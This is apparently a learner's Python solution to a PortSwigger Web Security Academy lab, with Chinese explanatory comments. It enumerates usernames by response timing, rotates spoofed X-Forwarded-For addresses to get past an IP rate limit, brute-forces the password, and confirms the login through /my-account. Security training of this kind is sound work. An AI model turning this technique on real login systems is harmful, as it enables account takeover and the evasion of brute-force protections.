import time
import requests
import urllib3
import statistics
from html.parser import HTMLParser
from urllib.parse import urlsplit

urllib3.disable_warnings()
URL = "https://0a96007403fe8bfb800099c1009f0076.web-security-academy.net/login"
TIMEOUT = (15, 60)
MAX_RETRIES = 3
VERIFY_TOP = 10
VERIFY_SAMPLES = 8
REQUEST_DELAY = 0.2

usernames = []
passwords = []

incorrect_password = "A" * 1000


class CsrfInputParser(HTMLParser):
   #定义一个继承自HTMLParser的类，用于扫描HTML标签

    def __init__(self):
        super().__init__()
        self.token = None
    #继承自父类时，调用父类的__init__方法以初始化父类部分，而self.token是子类新增的属性
    def handle_starttag(self, tag, attrs):
        if tag.lower() != "input":
            return
        attributes = dict(attrs) 
#attrs是列表，表值为二元元组如("type","hidden")，因此可以把表值转换成字典的键值对格式，把列表变成字典以使用.get()方法，但重复的属性-值对会被覆盖
        if attributes.get("name") == "csrf" and attributes.get("value"):  
#.get()方法若没找到对应的键或键值为空，会返回None或空字符串，如果使用attributes[name]，当"name"属性不存在时会抛keyError
            self.token = attributes["value"]


def validate_lab_url():
    host = (urlsplit(URL).hostname or "").lower()
    if urlsplit(URL).scheme != "https" or not host.endswith(".web-security-academy.net"):
        raise ValueError("URL must point to an HTTPS PortSwigger Academy lab instance")


def get_csrf_token(session):
    response = session.get(URL, timeout=TIMEOUT, verify=False)
    response.raise_for_status() #等价于if response.status_code >= 400: raise HTTPError(f"HTTP错误: {response.status_code}")
    parser = CsrfInputParser()
    parser.feed(response.text)#拼进内部缓冲区 self.rawdata， 调用 goahead() 主循环开始扫描。扫到<html>标签时执行handle_starttag('html',[]),return扫到<input>标签时执行handle_starttag('input',[("type","hidden"),("name","csrf"),("value","aX9k")])，命中，把self.token设为'aX9k'
    return parser.token


request_number = 0


def next_forwarded_for():
    """Give every login attempt a new test-range IP for this lab's rate limit."""
    global request_number
    request_number += 1
    number = request_number - 1
    return f"198.18.{(number // 254) % 256}.{(number % 254) + 1}"


def login1(session, username, password, csrf_token):
    #session形参把requests.Session()对象传入login1函数，避免在函数内部创建新的会话对象，从而保持会话状态（如cookies）在多个请求之间共享
    last_error = None

    for attempt in range(1, MAX_RETRIES + 1):
        time.sleep(REQUEST_DELAY)
        #防止请求过于频繁，导致被目标网站封禁IP，设置每次请求间隔REQUEST_DELAY秒
        
        try:
            start = time.perf_counter()
            data = {"username": username, "password": password}
            if csrf_token:
                data["csrf"] = csrf_token
            
            response = session.post(
                #发送正式请求
                URL,
                data=data,
                headers={"X-Forwarded-For": next_forwarded_for()},
#X-Forwarded-For是http请求头，格式为X-Forwarded-For: 客户端IP, 代理1IP, 代理2IP。当服务器盲目信任X-Forwarded_For时才生效。每次发送post请求后，request_number加1，next_forwarded_for()返回一个新的IP地址
                timeout=TIMEOUT,
                allow_redirects=False,
                verify=False  
             # 忽略SSL证书验证，避免因证书问题导致请求失败
            )
            elapsed = time.perf_counter() - start
            if request_number % 10 == 0:
                time.sleep(3)  #
            return response, elapsed
        
        except requests.RequestException as error:
            #requests.RequestException捕获所有请求异常，包括连接错误、超时、HTTP错误等
            last_error = error
            if attempt < MAX_RETRIES:
                print(f"[!] Request failed ({error}); retrying {attempt}/{MAX_RETRIES}...")
                time.sleep(attempt)

    raise RuntimeError(
        "The request repeatedly failed. Check the direct connection "
        "to the lab instance and try again."
    ) from last_error
    #RuntimeError是Python的内置类，
    #from last_error表示将原始异常作为上下文附加到新的异常中，以便在调试时可以追踪到原始错误信息

def compared_line(response):
    for line in response.text.splitlines():
        if 'is-warning' in line:
            return line
    return None    


def main():
    validate_lab_url()
    session = requests.Session()
    #只执行一次，创建一个会话实例对象，用于在多个请求之间保持某些参数（如cookies），而非独立请求
    session.trust_env = False
    #不走 https_proxy 环境变量里的代理：代理会杀空闲连接（SSL EOF 报错）且引入秒级抖动，
    #直连可以稳定复用 TCP/TLS 连接，把每请求耗时降到 RTT 量级，哈希计时信号才测得出来
    try:
        csrf_token = get_csrf_token(session)
    except requests.RequestException as error:
        print(f"[!] Unable to load the lab login page: {error}")
        return 1
    
    print("[*] Enumerating usernames...")
    timings = {}
    unique_usernames = list(dict.fromkeys(usernames))
    #先转换成字典去重再变回列表
    for count, username in enumerate(unique_usernames, start=1):
        response, elapsed = login1(session, username, incorrect_password, csrf_token)
        timings[username] = [elapsed]
        print(f"[{count:3}/{len(unique_usernames)}] {username:<24} {elapsed:.3f}s HTTP {response.status_code}") #输出类似："[  2/150] carlos                    0.501s HTTP 403"，":3"右对齐，位数不足自右往左补空格；"<:24"左对齐，位数不足自左往右补空格
        if response.status_code == 429: 
            #429 Too Many Requests
            print("[!] Rate limit response received; stop and inspect the request headers.")
            return 1

    
    ranked_usernames = sorted(timings, key=lambda name: statistics.median(timings[name]), reverse=True)
    #得到第一次排序后的用户名列表，按耗时从大到小排序
    for username in ranked_usernames[:VERIFY_TOP]:
        #取出排名前VERIFY_TOP的用户名，即前十个
        for _ in range(VERIFY_SAMPLES):
            _, elapsed = login1(session, username, incorrect_password, csrf_token)
            timings[username].append(elapsed)
            #对这些排名前十的用户名每个再测VERIFY_SAMPLES即八次耗时，每次耗时值追加在键值列表中而非timings字典末尾,此时timings字典中前十个用户名的键值列表长度为9

    ranked_usernames = sorted(timings, key=lambda name: statistics.median(timings[name]), reverse=True)
    #用原来耗时最长的十个用户名的各自八次测量结果求其耗时中位数然后替换原数据，重新排序，以尽量消除网络抖动，反映真实耗时
    print("[*] Timing ranking (median):")
    for username in ranked_usernames[:VERIFY_TOP]:
        #新的排名前VERIFY_TOP的用户名
        samples = ", ".join(f"{value:.3f}" for value in timings[username])
        #这时候timings[username]是一个多值列表，把每个值分别拿出来用", "连接成字符串，保留三位小数
        print(f"{username:<24} {statistics.median(timings[username]):.3f}s [{samples}]")

    valid_username = ranked_usernames[0]
    print(f"[+] Most likely valid username: {valid_username}")

    print("[*] Enumerating passwords...")
    unique_passwords = list(dict.fromkeys(passwords))
    for count, password in enumerate(unique_passwords, start=1):
        response, elapsed = login1(session, valid_username, password, csrf_token)
        print(f"[{count:3}/{len(unique_passwords)}] {elapsed:.3f}s HTTP {response.status_code}")
        # The official lab uses a 302 response as the successful-login signal.
        if response.status_code == 302:
            print("[+] Found password!")
            print(f"[+] Found valid credentials: {valid_username}:{password}")
            account_url = URL.rsplit("/", 1)[0] + "/my-account"
            account_response = session.get(account_url, timeout=TIMEOUT, verify=False)
            print(f"[+] GET /my-account: HTTP {account_response.status_code}")
            return 0
        if response.status_code == 429:
            print("[!] Rate limit response received; stop and inspect the request headers.")
            return 1

    print("[!] No candidate password returned HTTP 302.")
    return 1
    
if __name__ == "__main__":
    raise SystemExit(main())
#main()函数返回退出码0表示程序成功执行，返回1表示程序执行失败。


# [*] Timing ranking (median):
# puppet                   5.832s [5.540, 5.494, 5.832, 6.374, 6.073, 5.683, 6.490, 7.693, 5.470]
# an                       2.841s [2.841]
# carlos                   2.767s [2.767]
# akamai                   2.701s [2.701]
# ads                      2.701s [2.701]
# adkit                    2.696s [2.696]
# administrador            2.622s [2.622]
# acid                     2.621s [2.621]
# ar                       2.512s [2.512]
# alpha                    2.462s [2.462]

#测量得到了如上结果，可见第二次排序后的其它九个用户名的的samples列表都只有一个值，
#说明这九个用户名完全不是第一次测量后{timings}字典的前十个有多次测量值的用户名，否则samples=timings[username]列表长度不可能为1。
#这说明第一次测量后耗时从第二到第十的九个用户都是因网络抖动而误判的，在多次测量求中位数后回归到了真实耗时
